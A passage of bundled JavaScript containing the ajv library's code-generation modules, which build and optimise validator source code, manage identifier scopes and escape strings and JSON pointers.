      full;
      major;
      minor;
      patch;
    };
    VERSION = new Version("0.0.0-PLACEHOLDER");
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/codegen/code.js
var require_code = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/codegen/code.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.regexpCode = exports2.getEsmExportName = exports2.getProperty = exports2.safeStringify = exports2.stringify = exports2.strConcat = exports2.addCodeArg = exports2.str = exports2._ = exports2.nil = exports2._Code = exports2.Name = exports2.IDENTIFIER = exports2._CodeOrName = void 0;
    var _CodeOrName = class {
    };
    exports2._CodeOrName = _CodeOrName;
    exports2.IDENTIFIER = /^[a-z$_][a-z$_0-9]*$/i;
    var Name = class extends _CodeOrName {
      constructor(s) {
        super();
        if (!exports2.IDENTIFIER.test(s))
          throw new Error("CodeGen: name must be a valid identifier");
        this.str = s;
      }
      toString() {
        return this.str;
      }
      emptyStr() {
        return false;
      }
      get names() {
        return { [this.str]: 1 };
      }
    };
    exports2.Name = Name;
    var _Code = class extends _CodeOrName {
      constructor(code) {
        super();
        this._items = typeof code === "string" ? [code] : code;
      }
      toString() {
        return this.str;
      }
      emptyStr() {
        if (this._items.length > 1)
          return false;
        const item = this._items[0];
        return item === "" || item === '""';
      }
      get str() {
        var _a;
        return (_a = this._str) !== null && _a !== void 0 ? _a : this._str = this._items.reduce((s, c) => `${s}${c}`, "");
      }
      get names() {
        var _a;
        return (_a = this._names) !== null && _a !== void 0 ? _a : this._names = this._items.reduce((names, c) => {
          if (c instanceof Name)
            names[c.str] = (names[c.str] || 0) + 1;
          return names;
        }, {});
      }
    };
    exports2._Code = _Code;
    exports2.nil = new _Code("");
    function _(strs, ...args) {
      const code = [strs[0]];
      let i = 0;
      while (i < args.length) {
        addCodeArg(code, args[i]);
        code.push(strs[++i]);
      }
      return new _Code(code);
    }
    exports2._ = _;
    var plus = new _Code("+");
    function str(strs, ...args) {
      const expr = [safeStringify(strs[0])];
      let i = 0;
      while (i < args.length) {
        expr.push(plus);
        addCodeArg(expr, args[i]);
        expr.push(plus, safeStringify(strs[++i]));
      }
      optimize(expr);
      return new _Code(expr);
    }
    exports2.str = str;
    function addCodeArg(code, arg) {
      if (arg instanceof _Code)
        code.push(...arg._items);
      else if (arg instanceof Name)
        code.push(arg);
      else
        code.push(interpolate(arg));
    }
    exports2.addCodeArg = addCodeArg;
    function optimize(expr) {
      let i = 1;
      while (i < expr.length - 1) {
        if (expr[i] === plus) {
          const res = mergeExprItems(expr[i - 1], expr[i + 1]);
          if (res !== void 0) {
            expr.splice(i - 1, 3, res);
            continue;
          }
          expr[i++] = "+";
        }
        i++;
      }
    }
    function mergeExprItems(a, b) {
      if (b === '""')
        return a;
      if (a === '""')
        return b;
      if (typeof a == "string") {
        if (b instanceof Name || a[a.length - 1] !== '"')
          return;
        if (typeof b != "string")
          return `${a.slice(0, -1)}${b}"`;
        if (b[0] === '"')
          return a.slice(0, -1) + b.slice(1);
        return;
      }
      if (typeof b == "string" && b[0] === '"' && !(a instanceof Name))
        return `"${a}${b.slice(1)}`;
      return;
    }
    function strConcat(c1, c2) {
      return c2.emptyStr() ? c1 : c1.emptyStr() ? c2 : str`${c1}${c2}`;
    }
    exports2.strConcat = strConcat;
    function interpolate(x) {
      return typeof x == "number" || typeof x == "boolean" || x === null ? x : safeStringify(Array.isArray(x) ? x.join(",") : x);
    }
    function stringify(x) {
      return new _Code(safeStringify(x));
    }
    exports2.stringify = stringify;
    function safeStringify(x) {
      return JSON.stringify(x).replace(/\u2028/g, "\\u2028").replace(/\u2029/g, "\\u2029");
    }
    exports2.safeStringify = safeStringify;
    function getProperty(key) {
      return typeof key == "string" && exports2.IDENTIFIER.test(key) ? new _Code(`.${key}`) : _`[${key}]`;
    }
    exports2.getProperty = getProperty;
    function getEsmExportName(key) {
      if (typeof key == "string" && exports2.IDENTIFIER.test(key)) {
        return new _Code(`${key}`);
      }
      throw new Error(`CodeGen: invalid export name: ${key}, use explicit $id name mapping`);
    }
    exports2.getEsmExportName = getEsmExportName;
    function regexpCode(rx) {
      return new _Code(rx.toString());
    }
    exports2.regexpCode = regexpCode;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/codegen/scope.js
var require_scope = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/codegen/scope.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.ValueScope = exports2.ValueScopeName = exports2.Scope = exports2.varKinds = exports2.UsedValueState = void 0;
    var code_1 = require_code();
    var ValueError = class extends Error {
      constructor(name) {
        super(`CodeGen: "code" for ${name} not defined`);
        this.value = name.value;
      }
    };
    var UsedValueState;
    (function(UsedValueState2) {
      UsedValueState2[UsedValueState2["Started"] = 0] = "Started";
      UsedValueState2[UsedValueState2["Completed"] = 1] = "Completed";
    })(UsedValueState || (exports2.UsedValueState = UsedValueState = {}));
    exports2.varKinds = {
      const: new code_1.Name("const"),
      let: new code_1.Name("let"),
      var: new code_1.Name("var")
    };
    var Scope = class {
      constructor({ prefixes, parent } = {}) {
        this._names = {};
        this._prefixes = prefixes;
        this._parent = parent;
      }
      toName(nameOrPrefix) {
        return nameOrPrefix instanceof code_1.Name ? nameOrPrefix : this.name(nameOrPrefix);
      }
      name(prefix) {
        return new code_1.Name(this._newName(prefix));
      }
      _newName(prefix) {
        const ng = this._names[prefix] || this._nameGroup(prefix);
        return `${prefix}${ng.index++}`;
      }
      _nameGroup(prefix) {
        var _a, _b;
        if (((_b = (_a = this._parent) === null || _a === void 0 ? void 0 : _a._prefixes) === null || _b === void 0 ? void 0 : _b.has(prefix)) || this._prefixes && !this._prefixes.has(prefix)) {
          throw new Error(`CodeGen: prefix "${prefix}" is not allowed in this scope`);
        }
        return this._names[prefix] = { prefix, index: 0 };
      }
    };
    exports2.Scope = Scope;
    var ValueScopeName = class extends code_1.Name {
      constructor(prefix, nameStr) {
        super(nameStr);
        this.prefix = prefix;
      }
      setValue(value, { property, itemIndex }) {
        this.value = value;
        this.scopePath = (0, code_1._)`.${new code_1.Name(property)}[${itemIndex}]`;
      }
    };
    exports2.ValueScopeName = ValueScopeName;
    var line = (0, code_1._)`\n`;
    var ValueScope = class extends Scope {
      constructor(opts) {
        super(opts);
        this._values = {};
        this._scope = opts.scope;
        this.opts = { ...opts, _n: opts.lines ? line : code_1.nil };
      }
      get() {
        return this._scope;
      }
      name(prefix) {
        return new ValueScopeName(prefix, this._newName(prefix));
      }
      value(nameOrPrefix, value) {
        var _a;
        if (value.ref === void 0)
          throw new Error("CodeGen: ref must be passed in value");
        const name = this.toName(nameOrPrefix);
        const { prefix } = name;
        const valueKey = (_a = value.key) !== null && _a !== void 0 ? _a : value.ref;
        let vs = this._values[prefix];
        if (vs) {
          const _name = vs.get(valueKey);
          if (_name)
            return _name;
        } else {
          vs = this._values[prefix] = /* @__PURE__ */ new Map();
        }
        vs.set(valueKey, name);
        const s = this._scope[prefix] || (this._scope[prefix] = []);
        const itemIndex = s.length;
        s[itemIndex] = value.ref;
        name.setValue(value, { property: prefix, itemIndex });
        return name;
      }
      getValue(prefix, keyOrRef) {
        const vs = this._values[prefix];
        if (!vs)
          return;
        return vs.get(keyOrRef);
      }
      scopeRefs(scopeName, values = this._values) {
        return this._reduceValues(values, (name) => {
          if (name.scopePath === void 0)
            throw new Error(`CodeGen: name "${name}" has no value`);
          return (0, code_1._)`${scopeName}${name.scopePath}`;
        });
      }
      scopeCode(values = this._values, usedValues, getCode) {
        return this._reduceValues(values, (name) => {
          if (name.value === void 0)
            throw new Error(`CodeGen: name "${name}" has no value`);
          return name.value.code;
        }, usedValues, getCode);
      }
      _reduceValues(values, valueCode, usedValues = {}, getCode) {
        let code = code_1.nil;
        for (const prefix in values) {
          const vs = values[prefix];
          if (!vs)
            continue;
          const nameSet = usedValues[prefix] = usedValues[prefix] || /* @__PURE__ */ new Map();
          vs.forEach((name) => {
            if (nameSet.has(name))
              return;
            nameSet.set(name, UsedValueState.Started);
            let c = valueCode(name);
            if (c) {
              const def = this.opts.es5 ? exports2.varKinds.var : exports2.varKinds.const;
              code = (0, code_1._)`${code}${def} ${name} = ${c};${this.opts._n}`;
            } else if (c = getCode === null || getCode === void 0 ? void 0 : getCode(name)) {
              code = (0, code_1._)`${code}${c}${this.opts._n}`;
            } else {
              throw new ValueError(name);
            }
            nameSet.set(name, UsedValueState.Completed);
          });
        }
        return code;
      }
    };
    exports2.ValueScope = ValueScope;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/codegen/index.js
var require_codegen = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/codegen/index.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.or = exports2.and = exports2.not = exports2.CodeGen = exports2.operators = exports2.varKinds = exports2.ValueScopeName = exports2.ValueScope = exports2.Scope = exports2.Name = exports2.regexpCode = exports2.stringify = exports2.getProperty = exports2.nil = exports2.strConcat = exports2.str = exports2._ = void 0;
    var code_1 = require_code();
    var scope_1 = require_scope();
    var code_2 = require_code();
    Object.defineProperty(exports2, "_", { enumerable: true, get: function() {
      return code_2._;
    } });
    Object.defineProperty(exports2, "str", { enumerable: true, get: function() {
      return code_2.str;
    } });
    Object.defineProperty(exports2, "strConcat", { enumerable: true, get: function() {
      return code_2.strConcat;
    } });
    Object.defineProperty(exports2, "nil", { enumerable: true, get: function() {
      return code_2.nil;
    } });
    Object.defineProperty(exports2, "getProperty", { enumerable: true, get: function() {
      return code_2.getProperty;
    } });
    Object.defineProperty(exports2, "stringify", { enumerable: true, get: function() {
      return code_2.stringify;
    } });
    Object.defineProperty(exports2, "regexpCode", { enumerable: true, get: function() {
      return code_2.regexpCode;
    } });
    Object.defineProperty(exports2, "Name", { enumerable: true, get: function() {
      return code_2.Name;
    } });
    var scope_2 = require_scope();
    Object.defineProperty(exports2, "Scope", { enumerable: true, get: function() {
      return scope_2.Scope;
    } });
    Object.defineProperty(exports2, "ValueScope", { enumerable: true, get: function() {
      return scope_2.ValueScope;
    } });
    Object.defineProperty(exports2, "ValueScopeName", { enumerable: true, get: function() {
      return scope_2.ValueScopeName;
    } });
    Object.defineProperty(exports2, "varKinds", { enumerable: true, get: function() {
      return scope_2.varKinds;
    } });
    exports2.operators = {
      GT: new code_1._Code(">"),
      GTE: new code_1._Code(">="),
      LT: new code_1._Code("<"),
      LTE: new code_1._Code("<="),
      EQ: new code_1._Code("==="),
      NEQ: new code_1._Code("!=="),
      NOT: new code_1._Code("!"),
      OR: new code_1._Code("||"),
      AND: new code_1._Code("&&"),
      ADD: new code_1._Code("+")
    };
    var Node3 = class {
      optimizeNodes() {
        return this;
      }
      optimizeNames(_names, _constants) {
        return this;
      }
    };
    var Def = class extends Node3 {
      constructor(varKind, name, rhs) {
        super();
        this.varKind = varKind;
        this.name = name;
        this.rhs = rhs;
      }
      render({ es5, _n }) {
        const varKind = es5 ? scope_1.varKinds.var : this.varKind;
        const rhs = this.rhs === void 0 ? "" : ` = ${this.rhs}`;
        return `${varKind} ${this.name}${rhs};` + _n;
      }
      optimizeNames(names, constants2) {
        if (!names[this.name.str])
          return;
        if (this.rhs)
          this.rhs = optimizeExpr(this.rhs, names, constants2);
        return this;
      }
      get names() {
        return this.rhs instanceof code_1._CodeOrName ? this.rhs.names : {};
      }
    };
    var Assign = class extends Node3 {
      constructor(lhs, rhs, sideEffects) {
        super();
        this.lhs = lhs;
        this.rhs = rhs;
        this.sideEffects = sideEffects;
      }
      render({ _n }) {
        return `${this.lhs} = ${this.rhs};` + _n;
      }
      optimizeNames(names, constants2) {
        if (this.lhs instanceof code_1.Name && !names[this.lhs.str] && !this.sideEffects)
          return;
        this.rhs = optimizeExpr(this.rhs, names, constants2);
        return this;
      }
      get names() {
        const names = this.lhs instanceof code_1.Name ? {} : { ...this.lhs.names };
        return addExprNames(names, this.rhs);
      }
    };
    var AssignOp = class extends Assign {
      constructor(lhs, op, rhs, sideEffects) {
        super(lhs, rhs, sideEffects);
        this.op = op;
      }
      render({ _n }) {
        return `${this.lhs} ${this.op}= ${this.rhs};` + _n;
      }
    };
    var Label = class extends Node3 {
      constructor(label) {
        super();
        this.label = label;
        this.names = {};
      }
      render({ _n }) {
        return `${this.label}:` + _n;
      }
    };
    var Break = class extends Node3 {
      constructor(label) {
        super();
        this.label = label;
        this.names = {};
      }
      render({ _n }) {
        const label = this.label ? ` ${this.label}` : "";
        return `break${label};` + _n;
      }
    };
    var Throw = class extends Node3 {
      constructor(error) {
        super();
        this.error = error;
      }
      render({ _n }) {
        return `throw ${this.error};` + _n;
      }
      get names() {
        return this.error.names;
      }
    };
    var AnyCode = class extends Node3 {
      constructor(code) {
        super();
        this.code = code;
      }
      render({ _n }) {
        return `${this.code};` + _n;
      }
      optimizeNodes() {
        return `${this.code}` ? this : void 0;
      }
      optimizeNames(names, constants2) {
        this.code = optimizeExpr(this.code, names, constants2);
        return this;
      }
      get names() {
        return this.code instanceof code_1._CodeOrName ? this.code.names : {};
      }
    };
    var ParentNode = class extends Node3 {
      constructor(nodes = []) {
        super();
        this.nodes = nodes;
      }
      render(opts) {
        return this.nodes.reduce((code, n) => code + n.render(opts), "");
      }
      optimizeNodes() {
        const { nodes } = this;
        let i = nodes.length;
        while (i--) {
          const n = nodes[i].optimizeNodes();
          if (Array.isArray(n))
            nodes.splice(i, 1, ...n);
          else if (n)
            nodes[i] = n;
          else
            nodes.splice(i, 1);
        }
        return nodes.length > 0 ? this : void 0;
      }
      optimizeNames(names, constants2) {
        const { nodes } = this;
        let i = nodes.length;
        while (i--) {
          const n = nodes[i];
          if (n.optimizeNames(names, constants2))
            continue;
          subtractNames(names, n.names);
          nodes.splice(i, 1);
        }
        return nodes.length > 0 ? this : void 0;
      }
      get names() {
        return this.nodes.reduce((names, n) => addNames(names, n.names), {});
      }
    };
    var BlockNode = class extends ParentNode {
      render(opts) {
        return "{" + opts._n + super.render(opts) + "}" + opts._n;
      }
    };
    var Root = class extends ParentNode {
    };
    var Else = class extends BlockNode {
    };
    Else.kind = "else";
    var If = class _If extends BlockNode {
      constructor(condition, nodes) {
        super(nodes);
        this.condition = condition;
      }
      render(opts) {
        let code = `if(${this.condition})` + super.render(opts);
        if (this.else)
          code += "else " + this.else.render(opts);
        return code;
      }
      optimizeNodes() {
        super.optimizeNodes();
        const cond = this.condition;
        if (cond === true)
          return this.nodes;
        let e = this.else;
        if (e) {
          const ns = e.optimizeNodes();
          e = this.else = Array.isArray(ns) ? new Else(ns) : ns;
        }
        if (e) {
          if (cond === false)
            return e instanceof _If ? e : e.nodes;
          if (this.nodes.length)
            return this;
          return new _If(not(cond), e instanceof _If ? [e] : e.nodes);
        }
        if (cond === false || !this.nodes.length)
          return void 0;
        return this;
      }
      optimizeNames(names, constants2) {
        var _a;
        this.else = (_a = this.else) === null || _a === void 0 ? void 0 : _a.optimizeNames(names, constants2);
        if (!(super.optimizeNames(names, constants2) || this.else))
          return;
        this.condition = optimizeExpr(this.condition, names, constants2);
        return this;
      }
      get names() {
        const names = super.names;
        addExprNames(names, this.condition);
        if (this.else)
          addNames(names, this.else.names);
        return names;
      }
    };
    If.kind = "if";
    var For = class extends BlockNode {
    };
    For.kind = "for";
    var ForLoop = class extends For {
      constructor(iteration) {
        super();
        this.iteration = iteration;
      }
      render(opts) {
        return `for(${this.iteration})` + super.render(opts);
      }
      optimizeNames(names, constants2) {
        if (!super.optimizeNames(names, constants2))
          return;
        this.iteration = optimizeExpr(this.iteration, names, constants2);
        return this;
      }
      get names() {
        return addNames(super.names, this.iteration.names);
      }
    };
    var ForRange = class extends For {
      constructor(varKind, name, from, to) {
        super();
        this.varKind = varKind;
        this.name = name;
        this.from = from;
        this.to = to;
      }
      render(opts) {
        const varKind = opts.es5 ? scope_1.varKinds.var : this.varKind;
        const { name, from, to } = this;
        return `for(${varKind} ${name}=${from}; ${name}<${to}; ${name}++)` + super.render(opts);
      }
      get names() {
        const names = addExprNames(super.names, this.from);
        return addExprNames(names, this.to);
      }
    };
    var ForIter = class extends For {
      constructor(loop, varKind, name, iterable) {
        super();
        this.loop = loop;
        this.varKind = varKind;
        this.name = name;
        this.iterable = iterable;
      }
      render(opts) {
        return `for(${this.varKind} ${this.name} ${this.loop} ${this.iterable})` + super.render(opts);
      }
      optimizeNames(names, constants2) {
        if (!super.optimizeNames(names, constants2))
          return;
        this.iterable = optimizeExpr(this.iterable, names, constants2);
        return this;
      }
      get names() {
        return addNames(super.names, this.iterable.names);
      }
    };
    var Func = class extends BlockNode {
      constructor(name, args, async) {
        super();
        this.name = name;
        this.args = args;
        this.async = async;
      }
      render(opts) {
        const _async = this.async ? "async " : "";
        return `${_async}function ${this.name}(${this.args})` + super.render(opts);
      }
    };
    Func.kind = "func";
    var Return = class extends ParentNode {
      render(opts) {
        return "return " + super.render(opts);
      }
    };
    Return.kind = "return";
    var Try = class extends BlockNode {
      render(opts) {
        let code = "try" + super.render(opts);
        if (this.catch)
          code += this.catch.render(opts);
        if (this.finally)
          code += this.finally.render(opts);
        return code;
      }
      optimizeNodes() {
        var _a, _b;
        super.optimizeNodes();
        (_a = this.catch) === null || _a === void 0 ? void 0 : _a.optimizeNodes();
        (_b = this.finally) === null || _b === void 0 ? void 0 : _b.optimizeNodes();
        return this;
      }
      optimizeNames(names, constants2) {
        var _a, _b;
        super.optimizeNames(names, constants2);
        (_a = this.catch) === null || _a === void 0 ? void 0 : _a.optimizeNames(names, constants2);
        (_b = this.finally) === null || _b === void 0 ? void 0 : _b.optimizeNames(names, constants2);
        return this;
      }
      get names() {
        const names = super.names;
        if (this.catch)
          addNames(names, this.catch.names);
        if (this.finally)
          addNames(names, this.finally.names);
        return names;
      }
    };
    var Catch = class extends BlockNode {
      constructor(error) {
        super();
        this.error = error;
      }
      render(opts) {
        return `catch(${this.error})` + super.render(opts);
      }
    };
    Catch.kind = "catch";
    var Finally = class extends BlockNode {
      render(opts) {
        return "finally" + super.render(opts);
      }
    };
    Finally.kind = "finally";
    var CodeGen = class {
      constructor(extScope, opts = {}) {
        this._values = {};
        this._blockStarts = [];
        this._constants = {};
        this.opts = { ...opts, _n: opts.lines ? "\n" : "" };
        this._extScope = extScope;
        this._scope = new scope_1.Scope({ parent: extScope });
        this._nodes = [new Root()];
      }
      toString() {
        return this._root.render(this.opts);
      }
      // returns unique name in the internal scope
      name(prefix) {
        return this._scope.name(prefix);
      }
      // reserves unique name in the external scope
      scopeName(prefix) {
        return this._extScope.name(prefix);
      }
      // reserves unique name in the external scope and assigns value to it
      scopeValue(prefixOrName, value) {
        const name = this._extScope.value(prefixOrName, value);
        const vs = this._values[name.prefix] || (this._values[name.prefix] = /* @__PURE__ */ new Set());
        vs.add(name);
        return name;
      }
      getScopeValue(prefix, keyOrRef) {
        return this._extScope.getValue(prefix, keyOrRef);
      }
      // return code that assigns values in the external scope to the names that are used internally
      // (same names that were returned by gen.scopeName or gen.scopeValue)
      scopeRefs(scopeName) {
        return this._extScope.scopeRefs(scopeName, this._values);
      }
      scopeCode() {
        return this._extScope.scopeCode(this._values);
      }
      _def(varKind, nameOrPrefix, rhs, constant) {
        const name = this._scope.toName(nameOrPrefix);
        if (rhs !== void 0 && constant)
          this._constants[name.str] = rhs;
        this._leafNode(new Def(varKind, name, rhs));
        return name;
      }
      // `const` declaration (`var` in es5 mode)
      const(nameOrPrefix, rhs, _constant) {
        return this._def(scope_1.varKinds.const, nameOrPrefix, rhs, _constant);
      }
      // `let` declaration with optional assignment (`var` in es5 mode)
      let(nameOrPrefix, rhs, _constant) {
        return this._def(scope_1.varKinds.let, nameOrPrefix, rhs, _constant);
      }
      // `var` declaration with optional assignment
      var(nameOrPrefix, rhs, _constant) {
        return this._def(scope_1.varKinds.var, nameOrPrefix, rhs, _constant);
      }
      // assignment code
      assign(lhs, rhs, sideEffects) {
        return this._leafNode(new Assign(lhs, rhs, sideEffects));
      }
      // `+=` code
      add(lhs, rhs) {
        return this._leafNode(new AssignOp(lhs, exports2.operators.ADD, rhs));
      }
      // appends passed SafeExpr to code or executes Block
      code(c) {
        if (typeof c == "function")
          c();
        else if (c !== code_1.nil)
          this._leafNode(new AnyCode(c));
        return this;
      }
      // returns code for object literal for the passed argument list of key-value pairs
      object(...keyValues) {
        const code = ["{"];
        for (const [key, value] of keyValues) {
          if (code.length > 1)
            code.push(",");
          code.push(key);
          if (key !== value || this.opts.es5) {
            code.push(":");
            (0, code_1.addCodeArg)(code, value);
          }
        }
        code.push("}");
        return new code_1._Code(code);
      }
      // `if` clause (or statement if `thenBody` and, optionally, `elseBody` are passed)
      if(condition, thenBody, elseBody) {
        this._blockNode(new If(condition));
        if (thenBody && elseBody) {
          this.code(thenBody).else().code(elseBody).endIf();
        } else if (thenBody) {
          this.code(thenBody).endIf();
        } else if (elseBody) {
          throw new Error('CodeGen: "else" body without "then" body');
        }
        return this;
      }
      // `else if` clause - invalid without `if` or after `else` clauses
      elseIf(condition) {
        return this._elseNode(new If(condition));
      }
      // `else` clause - only valid after `if` or `else if` clauses
      else() {
        return this._elseNode(new Else());
      }
      // end `if` statement (needed if gen.if was used only with condition)
      endIf() {
        return this._endBlockNode(If, Else);
      }
      _for(node, forBody) {
        this._blockNode(node);
        if (forBody)
          this.code(forBody).endFor();
        return this;
      }
      // a generic `for` clause (or statement if `forBody` is passed)
      for(iteration, forBody) {
        return this._for(new ForLoop(iteration), forBody);
      }
      // `for` statement for a range of values
      forRange(nameOrPrefix, from, to, forBody, varKind = this.opts.es5 ? scope_1.varKinds.var : scope_1.varKinds.let) {
        const name = this._scope.toName(nameOrPrefix);
        return this._for(new ForRange(varKind, name, from, to), () => forBody(name));
      }
      // `for-of` statement (in es5 mode replace with a normal for loop)
      forOf(nameOrPrefix, iterable, forBody, varKind = scope_1.varKinds.const) {
        const name = this._scope.toName(nameOrPrefix);
        if (this.opts.es5) {
          const arr = iterable instanceof code_1.Name ? iterable : this.var("_arr", iterable);
          return this.forRange("_i", 0, (0, code_1._)`${arr}.length`, (i) => {
            this.var(name, (0, code_1._)`${arr}[${i}]`);
            forBody(name);
          });
        }
        return this._for(new ForIter("of", varKind, name, iterable), () => forBody(name));
      }
      // `for-in` statement.
      // With option `ownProperties` replaced with a `for-of` loop for object keys
      forIn(nameOrPrefix, obj, forBody, varKind = this.opts.es5 ? scope_1.varKinds.var : scope_1.varKinds.const) {
        if (this.opts.ownProperties) {
          return this.forOf(nameOrPrefix, (0, code_1._)`Object.keys(${obj})`, forBody);
        }
        const name = this._scope.toName(nameOrPrefix);
        return this._for(new ForIter("in", varKind, name, obj), () => forBody(name));
      }
      // end `for` loop
      endFor() {
        return this._endBlockNode(For);
      }
      // `label` statement
      label(label) {
        return this._leafNode(new Label(label));
      }
      // `break` statement
      break(label) {
        return this._leafNode(new Break(label));
      }
      // `return` statement
      return(value) {
        const node = new Return();
        this._blockNode(node);
        this.code(value);
        if (node.nodes.length !== 1)
          throw new Error('CodeGen: "return" should have one node');
        return this._endBlockNode(Return);
      }
      // `try` statement
      try(tryBody, catchCode, finallyCode) {
        if (!catchCode && !finallyCode)
          throw new Error('CodeGen: "try" without "catch" and "finally"');
        const node = new Try();
        this._blockNode(node);
        this.code(tryBody);
        if (catchCode) {
          const error = this.name("e");
          this._currNode = node.catch = new Catch(error);
          catchCode(error);
        }
        if (finallyCode) {
          this._currNode = node.finally = new Finally();
          this.code(finallyCode);
        }
        return this._endBlockNode(Catch, Finally);
      }
      // `throw` statement
      throw(error) {
        return this._leafNode(new Throw(error));
      }
      // start self-balancing block
      block(body, nodeCount) {
        this._blockStarts.push(this._nodes.length);
        if (body)
          this.code(body).endBlock(nodeCount);
        return this;
      }
      // end the current self-balancing block
      endBlock(nodeCount) {
        const len = this._blockStarts.pop();
        if (len === void 0)
          throw new Error("CodeGen: not in self-balancing block");
        const toClose = this._nodes.length - len;
        if (toClose < 0 || nodeCount !== void 0 && toClose !== nodeCount) {
          throw new Error(`CodeGen: wrong number of nodes: ${toClose} vs ${nodeCount} expected`);
        }
        this._nodes.length = len;
        return this;
      }
      // `function` heading (or definition if funcBody is passed)
      func(name, args = code_1.nil, async, funcBody) {
        this._blockNode(new Func(name, args, async));
        if (funcBody)
          this.code(funcBody).endFunc();
        return this;
      }
      // end function definition
      endFunc() {
        return this._endBlockNode(Func);
      }
      optimize(n = 1) {
        while (n-- > 0) {
          this._root.optimizeNodes();
          this._root.optimizeNames(this._root.names, this._constants);
        }
      }
      _leafNode(node) {
        this._currNode.nodes.push(node);
        return this;
      }
      _blockNode(node) {
        this._currNode.nodes.push(node);
        this._nodes.push(node);
      }
      _endBlockNode(N1, N2) {
        const n = this._currNode;
        if (n instanceof N1 || N2 && n instanceof N2) {
          this._nodes.pop();
          return this;
        }
        throw new Error(`CodeGen: not in block "${N2 ? `${N1.kind}/${N2.kind}` : N1.kind}"`);
      }
      _elseNode(node) {
        const n = this._currNode;
        if (!(n instanceof If)) {
          throw new Error('CodeGen: "else" without "if"');
        }
        this._currNode = n.else = node;
        return this;
      }
      get _root() {
        return this._nodes[0];
      }
      get _currNode() {
        const ns = this._nodes;
        return ns[ns.length - 1];
      }
      set _currNode(node) {
        const ns = this._nodes;
        ns[ns.length - 1] = node;
      }
    };
    exports2.CodeGen = CodeGen;
    function addNames(names, from) {
      for (const n in from)
        names[n] = (names[n] || 0) + (from[n] || 0);
      return names;
    }
    function addExprNames(names, from) {
      return from instanceof code_1._CodeOrName ? addNames(names, from.names) : names;
    }
    function optimizeExpr(expr, names, constants2) {
      if (expr instanceof code_1.Name)
        return replaceName(expr);
      if (!canOptimize(expr))
        return expr;
      return new code_1._Code(expr._items.reduce((items, c) => {
        if (c instanceof code_1.Name)
          c = replaceName(c);
        if (c instanceof code_1._Code)
          items.push(...c._items);
        else
          items.push(c);
        return items;
      }, []));
      function replaceName(n) {
        const c = constants2[n.str];
        if (c === void 0 || names[n.str] !== 1)
          return n;
        delete names[n.str];
        return c;
      }
      function canOptimize(e) {
        return e instanceof code_1._Code && e._items.some((c) => c instanceof code_1.Name && names[c.str] === 1 && constants2[c.str] !== void 0);
      }
    }
    function subtractNames(names, from) {
      for (const n in from)
        names[n] = (names[n] || 0) - (from[n] || 0);
    }
    function not(x) {
      return typeof x == "boolean" || typeof x == "number" || x === null ? !x : (0, code_1._)`!${par(x)}`;
    }
    exports2.not = not;
    var andCode = mappend(exports2.operators.AND);
    function and(...args) {
      return args.reduce(andCode);
    }
    exports2.and = and;
    var orCode = mappend(exports2.operators.OR);
    function or(...args) {
      return args.reduce(orCode);
    }
    exports2.or = or;
    function mappend(op) {
      return (x, y) => x === code_1.nil ? y : y === code_1.nil ? x : (0, code_1._)`${par(x)} ${op} ${par(y)}`;
    }
    function par(x) {
      return x instanceof code_1.Name ? x : (0, code_1._)`(${x})`;
    }
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/util.js
var require_util = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/util.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.checkStrictMode = exports2.getErrorPath = exports2.Type = exports2.useFunc = exports2.setEvaluated = exports2.evaluatedPropsToName = exports2.mergeEvaluated = exports2.eachItem = exports2.unescapeJsonPointer = exports2.escapeJsonPointer = exports2.escapeFragment = exports2.unescapeFragment = exports2.schemaRefOrVal = exports2.schemaHasRulesButRef = exports2.schemaHasRules = exports2.checkUnknownRules = exports2.alwaysValidSchema = exports2.toHash = void 0;
    var codegen_1 = require_codegen();
    var code_1 = require_code();
    function toHash(arr) {
      const hash = {};
      for (const item of arr)
        hash[item] = true;
      return hash;
    }
    exports2.toHash = toHash;
    function alwaysValidSchema(it, schema) {
      if (typeof schema == "boolean")
        return schema;
      if (Object.keys(schema).length === 0)
        return true;
      checkUnknownRules(it, schema);
      return !schemaHasRules(schema, it.self.RULES.all);
    }
    exports2.alwaysValidSchema = alwaysValidSchema;
    function checkUnknownRules(it, schema = it.schema) {
      const { opts, self } = it;
      if (!opts.strictSchema)
        return;
      if (typeof schema === "boolean")
        return;
      const rules = self.RULES.keywords;
      for (const key in schema) {
        if (!rules[key])
          checkStrictMode(it, `unknown keyword: "${key}"`);
      }
    }
    exports2.checkUnknownRules = checkUnknownRules;
    function schemaHasRules(schema, rules) {
      if (typeof schema == "boolean")
        return !schema;
      for (const key in schema)
        if (rules[key])
          return true;
      return false;
    }
    exports2.schemaHasRules = schemaHasRules;
    function schemaHasRulesButRef(schema, RULES) {
      if (typeof schema == "boolean")
        return !schema;
      for (const key in schema)
        if (key !== "$ref" && RULES.all[key])
          return true;
      return false;
    }
    exports2.schemaHasRulesButRef = schemaHasRulesButRef;
    function schemaRefOrVal({ topSchemaRef, schemaPath }, schema, keyword, $data) {
      if (!$data) {
        if (typeof schema == "number" || typeof schema == "boolean")
          return schema;
        if (typeof schema == "string")
          return (0, codegen_1._)`${schema}`;
      }
      return (0, codegen_1._)`${topSchemaRef}${schemaPath}${(0, codegen_1.getProperty)(keyword)}`;
    }
    exports2.schemaRefOrVal = schemaRefOrVal;
    function unescapeFragment(str) {
      return unescapeJsonPointer(decodeURIComponent(str));
    }
    exports2.unescapeFragment = unescapeFragment;
    function escapeFragment(str) {
      return encodeURIComponent(escapeJsonPointer(str));
    }
    exports2.escapeFragment = escapeFragment;
    function escapeJsonPointer(str) {
      if (typeof str == "number")
        return `${str}`;
      return str.replace(/~/g, "~0").replace(/\//g, "~1");
    }
